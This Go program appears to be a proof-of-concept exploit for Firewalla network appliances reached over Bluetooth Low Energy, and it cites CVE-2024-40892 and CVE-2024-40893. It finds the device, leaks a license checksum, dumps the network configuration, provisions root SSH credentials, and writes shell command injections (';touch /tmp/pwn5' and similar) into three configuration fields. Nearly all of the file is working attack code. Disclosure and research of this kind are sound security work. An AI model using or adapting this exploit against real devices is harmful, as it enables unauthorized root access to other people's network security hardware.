package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"

	"github.com/xen0bit/fwbt/pkg/btapi"
	"tinygo.org/x/bluetooth"
)

var adapter = bluetooth.DefaultAdapter

// Fill this out with license UUID
var myLicense = ""

func main() {
	// Enable BLE interface.
	must("enable BLE stack", adapter.Enable())

	ch := make(chan bluetooth.ScanResult, 1)

	// Start scanning.
	println("scanning...")
	err := adapter.Scan(func(adapter *bluetooth.Adapter, result bluetooth.ScanResult) {
		if result.LocalName() == "FirewallaP" {
			println("found device:", result.Address.String(), result.RSSI, result.LocalName())
			adapter.StopScan()
			ch <- result
		}
	})

	if err != nil {
		panic(err)
	}

	var device bluetooth.Device
	select {
	case result := <-ch:
		device, err = adapter.Connect(result.Address, bluetooth.ConnectionParams{})
		if err != nil {
			println(err.Error())
			return
		}

		println("connected to ", result.Address.String())
	}

	//discovering services/characteristics
	srvcs, err := device.DiscoverServices(nil)
	must("discover services", err)

	//Check if we've made a local copy of the base config before messing with anything
	if _, err := os.Stat("base_config.json"); errors.Is(err, os.ErrNotExist) {
		fmt.Println("No local copy of base config found, leaking license checksum...")

		// Weaken for CVE-2024-40892
		fmt.Println("Leaking license UUID CheckSum...")
		po, err := btapi.PairingService(srvcs)
		if err != nil {
			panic(err)
		}
		fmt.Println("Leaked license Checksum:", po.Cs)

		//If we've cracked/bruteforced the rest of the license, dump config and back it up locally
		if myLicense != "" {
			nc, _ := btapi.NetworkServiceRead(srvcs, myLicense)
			baseConfig, _ := json.Marshal(nc)

			if err := os.WriteFile("base_config.json", baseConfig, 0644); err != nil {
				panic(err)
			}
		}

	} else {
		fmt.Println("Found local copy of base config, continuing...")

		//Actual CVE-2024-40892
		fmt.Println("Provisioning root SSH credentials...")
		btapi.CredentialService(srvcs, myLicense)

		//Three command injections for CVE-2024-40893
		f, _ := os.ReadFile("base_config.json")
		nc := &btapi.NetworkConfig{}
		if err := json.Unmarshal(f, nc); err != nil {
			panic(err)
		}

		nc.Interface.Phy.Eth0.Extra.PingTestIP = []string{";touch /tmp/pwn5"}
		nc.Interface.Phy.Eth0.Extra.DNSTestDomain = ";touch /tmp/pwn6"
		nc.Interface.Phy.Eth0.Gateway6 = ";touch /tmp/pwn7"

		btapi.NetworkServiceWrite(srvcs, *nc, myLicense)
	}

	err = device.Disconnect()
	if err != nil {
		println(err)
	}
}

func must(action string, err error) {
	if err != nil {
		panic("failed to " + action + ": " + err.Error())
	}
}
